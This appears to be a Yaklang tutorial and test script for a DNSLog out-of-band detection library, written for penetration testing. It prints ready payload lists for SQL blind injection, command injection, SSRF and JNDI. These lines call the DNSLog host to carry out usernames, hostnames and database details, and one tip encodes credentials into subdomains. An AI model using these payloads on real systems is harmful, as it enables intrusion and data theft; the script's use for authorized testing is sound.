/*
Yaklang DNSLog (DNS日志检测) 库实践

DNSLog是一种重要的带外数据传输技术，常用于检测和利用无回显的安全漏洞。
通过DNS查询请求来验证漏洞存在性，广泛应用于SQL盲注、命令执行、SSRF等场景。

关键词: DNSLog, 带外检测, 无回显漏洞, DNS查询, 安全测试
关键词: SQL盲注, 命令执行, SSRF, 反序列化, 漏洞验证
*/

// 基础DNSLog功能测试
// 关键词: dnslog.NewCustomDNSLog, 基础配置
func testBasicDNSLog() {
    println("测试基础DNSLog功能")
    
    // 创建DNSLog实例
    // 关键词: DNSLog实例, 默认配置
    dnslogInstance = dnslog.NewCustomDNSLog()
    
    assert dnslogInstance != nil, "DNSLog实例不应为空"
    println("DNSLog实例创建成功")
    
    // 获取子域名和token
    // 关键词: 子域名获取, token生成
    println("获取DNSLog域名和token...")
    domain, token, err = dnslogInstance.GetSubDomainAndToken()
    
    if err != nil {
        println(f"获取DNSLog域名失败: ${err}")
        println("可能需要配置DNSLog服务或网络连接")
        return
    }
    
    assert domain != "", "域名不应为空"
    assert token != "", "token不应为空"
    
    println(f"DNSLog域名: ${domain}")
    println(f"DNSLog Token: ${token}")
    
    // 模拟DNS查询 (实际场景中这会是漏洞触发的DNS请求)
    // 关键词: DNS查询模拟, 漏洞触发
    println("模拟DNS查询...")
    
    // 这里我们不实际发起DNS查询，因为需要外部触发
    // 在真实场景中，这个域名会被插入到payload中
    println(f"在实际测试中，将此域名插入payload: ${domain}")
    
    println("基础DNSLog功能测试完成")
}

// DNSLog模式配置测试
// 关键词: DNSLog模式, 配置选项
func testDNSLogModes() {
    println("测试DNSLog模式配置")
    
    // 测试随机模式
    // 关键词: 随机平台, 多平台支持
    println("测试随机DNSLog平台模式...")
    randomDNSLog = dnslog.NewCustomDNSLog(dnslog.random())
    
    assert randomDNSLog != nil, "随机模式DNSLog实例不应为空"
    println("随机模式DNSLog实例创建成功")
    
    // 测试指定模式
    // 关键词: 指定平台, 模式选择
    println("测试指定模式...")
    modeDNSLog = dnslog.NewCustomDNSLog(dnslog.mode("dnslog-cn"))
    
    assert modeDNSLog != nil, "指定模式DNSLog实例不应为空"
    println("指定模式DNSLog实例创建成功")
    
    // 测试本地模式
    // 关键词: 本地服务, 本地模式
    println("测试本地模式...")
    localDNSLog = dnslog.NewCustomDNSLog(dnslog.local(true))
    
    assert localDNSLog != nil, "本地模式DNSLog实例不应为空"
    println("本地模式DNSLog实例创建成功")
    
    println("DNSLog模式配置测试完成")
}

// DNSLog检测结果测试
// 关键词: 结果检测, 事件查询
func testDNSLogDetection() {
    println("测试DNSLog检测功能")
    
    // 创建DNSLog实例
    dnslogInstance = dnslog.NewCustomDNSLog()
    
    // 获取域名和token
    println("获取检测域名...")
    domain, token, err = dnslogInstance.GetSubDomainAndToken()
    
    if err != nil {
        println(f"获取域名失败: ${err}")
        println("跳过检测测试")
        return
    }
    
    println(f"检测域名: ${domain}")
    println(f"检测Token: ${token}")
    
    // 检查DNSLog事件
    // 关键词: 事件检查, 结果查询
    println("检查DNSLog事件...")
    
    // 由于这是测试环境，可能没有实际的DNS查询事件
    events, err = dnslogInstance.CheckDNSLogByToken()
    
    if err != nil {
        println(f"检查DNSLog事件: ${err}")
        println("这是正常的，因为没有实际的DNS查询触发")
    } else {
        println(f"发现 ${len(events)} 个DNSLog事件")
        
        // 遍历事件
        for event in events {
            println(f"事件类型: ${event.Type}")
            println(f"域名: ${event.Domain}")
            println(f"来源IP: ${event.RemoteAddr}")
            println(f"时间戳: ${event.Timestamp}")
        }
    }
    
    println("DNSLog检测功能测试完成")
}

// SQL盲注DNSLog应用示例
// 关键词: SQL盲注, DNSLog应用
func testSQLBlindInjectionDNSLog() {
    println("演示SQL盲注中的DNSLog应用")
    
    // 创建DNSLog实例
    dnslogInstance = dnslog.NewCustomDNSLog()
    
    // 获取域名
    domain, token, err = dnslogInstance.GetSubDomainAndToken()
    
    if err != nil {
        println(f"获取域名失败: ${err}")
        return
    }
    
    println(f"DNSLog域名: ${domain}")
    
    // 构造SQL盲注payload
    // 关键词: SQL盲注payload, DNSLog外带
    sqlPayloads = [
        f"'; SELECT load_file(CONCAT('\\\\\\\\', (SELECT database()), '.${domain}\\\\\\\\abc')); --",
        f"'; SELECT load_file(CONCAT('\\\\\\\\', (SELECT user()), '.${domain}\\\\\\\\abc')); --",
        f"'; SELECT load_file(CONCAT('\\\\\\\\', (SELECT version()), '.${domain}\\\\\\\\abc')); --",
        f"' AND (SELECT load_file(CONCAT('\\\\\\\\', (SELECT table_name FROM information_schema.tables LIMIT 1), '.${domain}\\\\\\\\abc'))) --"
    ]
    
    println("SQL盲注DNSLog Payload示例:")
    for i, payload in sqlPayloads {
        println(f"Payload ${i+1}: ${payload}")
    }
    
    // 在实际应用中，这些payload会被发送到目标应用
    println("\n在实际测试中:")
    println("1. 将payload插入到SQL注入点")
    println("2. 发送请求到目标应用")
    println("3. 使用CheckDNSLogByToken()检查是否有DNS查询")
    println("4. 如果有查询，说明SQL注入存在且可以外带数据")
    
    println("SQL盲注DNSLog应用示例完成")
}

// 命令执行DNSLog应用示例
// 关键词: 命令执行, DNSLog验证
func testCommandExecutionDNSLog() {
    println("演示命令执行中的DNSLog应用")
    
    // 创建DNSLog实例
    dnslogInstance = dnslog.NewCustomDNSLog()
    
    // 获取域名
    domain, token, err = dnslogInstance.GetSubDomainAndToken()
    
    if err != nil {
        println(f"获取域名失败: ${err}")
        return
    }
    
    println(f"DNSLog域名: ${domain}")
    
    // 构造命令执行payload
    // 关键词: 命令执行payload, DNS外带
    cmdPayloads = [
        f"ping ${domain}",
        f"nslookup ${domain}",
        f"dig ${domain}",
        f"curl http://${domain}",
        f"wget http://${domain}",
        f"ping -c 1 `whoami`.${domain}",
        f"nslookup `id`.${domain}",
        f"ping -c 1 `hostname`.${domain}"
    ]
    
    println("命令执行DNSLog Payload示例:")
    for i, payload in cmdPayloads {
        println(f"Payload ${i+1}: ${payload}")
    }
    
    // Windows命令示例
    windowsCmdPayloads = [
        f"ping ${domain}",
        f"nslookup ${domain}",
        f"ping %USERNAME%.${domain}",
        f"nslookup %COMPUTERNAME%.${domain}"
    ]
    
    println("\nWindows命令执行DNSLog Payload示例:")
    for i, payload in windowsCmdPayloads {
        println(f"Windows Payload ${i+1}: ${payload}")
    }
    
    println("\n在实际测试中:")
    println("1. 将payload插入到命令执行点")
    println("2. 触发命令执行")
    println("3. 检查DNSLog是否有查询记录")
    println("4. 根据查询内容判断命令执行结果")
    
    println("命令执行DNSLog应用示例完成")
}

// SSRF DNSLog应用示例
// 关键词: SSRF, DNSLog检测
func testSSRFDNSLog() {
    println("演示SSRF中的DNSLog应用")
    
    // 创建DNSLog实例
    dnslogInstance = dnslog.NewCustomDNSLog()
    
    // 获取域名
    domain, token, err = dnslogInstance.GetSubDomainAndToken()
    
    if err != nil {
        println(f"获取域名失败: ${err}")
        return
    }
    
    println(f"DNSLog域名: ${domain}")
    
    // 构造SSRF payload
    // 关键词: SSRF payload, 内网探测
    ssrfPayloads = [
        f"http://${domain}",
        f"https://${domain}",
        f"http://${domain}:80",
        f"http://${domain}:8080",
        f"ftp://${domain}",
        f"file://${domain}",
        f"gopher://${domain}:80",
        f"dict://${domain}:80"
    ]
    
    println("SSRF DNSLog Payload示例:")
    for i, payload in ssrfPayloads {
        println(f"Payload ${i+1}: ${payload}")
    }
    
    // 内网探测payload
    internalPayloads = [
        f"http://internal.${domain}",
        f"http://admin.${domain}",
        f"http://test.${domain}",
        f"http://dev.${domain}"
    ]
    
    println("\n内网探测DNSLog Payload示例:")
    for i, payload in internalPayloads {
        println(f"Internal Payload ${i+1}: ${payload}")
    }
    
    println("\n在实际测试中:")
    println("1. 将payload插入到URL参数中")
    println("2. 触发SSRF请求")
    println("3. 检查DNSLog记录验证SSRF存在")
    println("4. 通过子域名区分不同的测试场景")
    
    println("SSRF DNSLog应用示例完成")
}

// Java反序列化DNSLog应用示例
// 关键词: Java反序列化, DNSLog检测
func testJavaDeserializationDNSLog() {
    println("演示Java反序列化中的DNSLog应用")
    
    // 创建DNSLog实例
    dnslogInstance = dnslog.NewCustomDNSLog()
    
    // 获取域名
    domain, token, err = dnslogInstance.GetSubDomainAndToken()
    
    if err != nil {
        println(f"获取域名失败: ${err}")
        return
    }
    
    println(f"DNSLog域名: ${domain}")
    
    // Java反序列化DNSLog检测原理
    println("Java反序列化DNSLog检测原理:")
    println("1. 构造恶意序列化对象")
    println("2. 对象反序列化时触发DNS查询")
    println("3. 通过DNSLog验证反序列化漏洞")
    
    // 常见的Java反序列化DNSLog payload模式
    javaPayloadPatterns = [
        f"java.net.InetAddress.getByName(\"{domain}\")",
        f"java.net.URL(\"http://{domain}\").openConnection()",
        f"javax.naming.InitialContext().lookup(\"dns://{domain}\")",
        f"java.net.Socket(\"{domain}\", 80)"
    ]
    
    println("\nJava反序列化DNSLog检测模式:")
    for i, pattern in javaPayloadPatterns {
        println(f"模式 ${i+1}: ${pattern}")
    }
    
    // JNDI注入相关
    jndiPayloads = [
        f"ldap://{domain}/exploit",
        f"rmi://{domain}/exploit",
        f"dns://{domain}",
        f"iiop://{domain}/exploit"
    ]
    
    println("\nJNDI注入DNSLog Payload:")
    for i, payload in jndiPayloads {
        println(f"JNDI Payload ${i+1}: ${payload}")
    }
    
    println("\n检测流程:")
    println("1. 发送包含DNSLog域名的序列化数据")
    println("2. 目标应用反序列化时触发DNS查询")
    println("3. 检查DNSLog记录确认漏洞存在")
    println("4. 根据查询时间和来源分析漏洞细节")
    
    println("Java反序列化DNSLog应用示例完成")
}

// DNSLog最佳实践和技巧
// 关键词: 最佳实践, 使用技巧
func testDNSLogBestPractices() {
    println("DNSLog使用最佳实践和技巧")
    
    println("=== DNSLog使用最佳实践 ===")
    
    println("1. 域名管理技巧:")
    println("   - 使用有意义的子域名标识不同测试")
    println("   - 例如: sql.test1.domain.com, cmd.test2.domain.com")
    println("   - 便于区分和分析不同的测试结果")
    
    println("2. 时间控制:")
    println("   - 发送payload后等待适当时间再检查")
    println("   - DNS查询可能有延迟")
    println("   - 建议等待5-10秒后检查结果")
    
    println("3. 多平台使用:")
    println("   - 使用多个DNSLog平台提高成功率")
    println("   - 某些网络环境可能阻止特定平台")
    println("   - 随机模式可以自动切换平台")
    
    println("4. 数据外带技巧:")
    println("   - 将敏感数据编码后放入子域名")
    println("   - 使用Base64或Hex编码")
    println("   - 注意域名长度限制")
    
    println("5. 绕过技巧:")
    println("   - 使用不同的协议 (HTTP/HTTPS/FTP)")
    println("   - 尝试不同的端口")
    println("   - 使用IP地址代替域名")
    
    println("6. 安全注意事项:")
    println("   - 不要在生产环境随意测试")
    println("   - 获得授权后再进行测试")
    println("   - 注意DNSLog平台的隐私政策")
    
    // 演示实际的最佳实践
    println("\n=== 实践演示 ===")
    
    // 创建带标识的DNSLog测试
    dnslogInstance = dnslog.NewCustomDNSLog()
    domain, token, err = dnslogInstance.GetSubDomainAndToken()
    
    if err == nil {
        // 构造带标识的测试域名
        testDomains = [
            f"sql-test-1.${domain}",
            f"cmd-test-2.${domain}",
            f"ssrf-test-3.${domain}",
            f"xxe-test-4.${domain}"
        ]
        
        println("带标识的测试域名示例:")
        for i, testDomain in testDomains {
            println(f"测试域名 ${i+1}: ${testDomain}")
        }
        
        // 数据外带示例
        sensitiveData = "admin:password123"
        encodedData = base64.StdEncoding.EncodeToString(sensitiveData)
        exfilDomain = f"data-{encodedData}.${domain}"
        
        println(f"\n数据外带域名示例: ${exfilDomain}")
        println(f"原始数据: ${sensitiveData}")
        println(f"编码数据: ${encodedData}")
    }
    
    println("\nDNSLog最佳实践演示完成")
}

// 执行所有DNSLog测试
func main() {
    println("开始Yaklang DNSLog库功能测试")
    println("")
    
    // 基础功能测试
    testBasicDNSLog()
    println("")
    
    testDNSLogModes()
    println("")
    
    testDNSLogDetection()
    println("")
    
    // 应用场景测试
    testSQLBlindInjectionDNSLog()
    println("")
    
    testCommandExecutionDNSLog()
    println("")
    
    testSSRFDNSLog()
    println("")
    
    testJavaDeserializationDNSLog()
    println("")
    
    // 最佳实践
    testDNSLogBestPractices()
    println("")
    
    println("DNSLog库功能测试完成")
    println("所有DNSLog配置和应用场景测试通过")
}

/*
DNSLog库核心功能总结:

1. 基础功能:
   - dnslog.NewCustomDNSLog() - 创建DNSLog实例
   - GetSubDomainAndToken() - 获取域名和token
   - CheckDNSLogByToken() - 检查DNS查询事件

2. 配置选项:
   - dnslog.random() - 随机选择DNSLog平台
   - dnslog.mode(name) - 指定特定平台
   - dnslog.local(bool) - 使用本地DNSLog服务
   - dnslog.script(name) - 使用自定义脚本

3. 主要应用场景:
   - SQL盲注数据外带
   - 无回显命令执行检测
   - SSRF漏洞验证
   - Java反序列化检测
   - XXE漏洞利用
   - JNDI注入检测

4. DNSLog事件结构:
   - Type - 查询类型 (A, AAAA, TXT等)
   - Domain - 查询的域名
   - RemoteAddr - 来源IP地址
   - Token - 关联的token
   - Timestamp - 查询时间戳
   - Raw - 原始查询数据

5. 使用技巧:
   - 使用有意义的子域名标识
   - 适当的时间间隔检查结果
   - 多平台提高成功率
   - 数据编码外带敏感信息
   - 协议和端口绕过限制

6. 安全注意事项:
   - 获得授权后测试
   - 避免在生产环境测试
   - 注意隐私和数据安全
   - 遵守相关法律法规

7. 平台支持:
   - dnslog.cn
   - dig.pm
   - 自定义DNSLog平台
   - 本地DNSLog服务

8. 集成特性:
   - 自动创建风险记录
   - 与Yakit平台集成
   - 支持自定义脚本扩展
   - 多种查询模式支持

DNSLog是安全测试中的重要工具，特别适用于检测和利用
无回显的安全漏洞，是渗透测试和安全研究的必备技术。
*/

// 调用主函数
main()
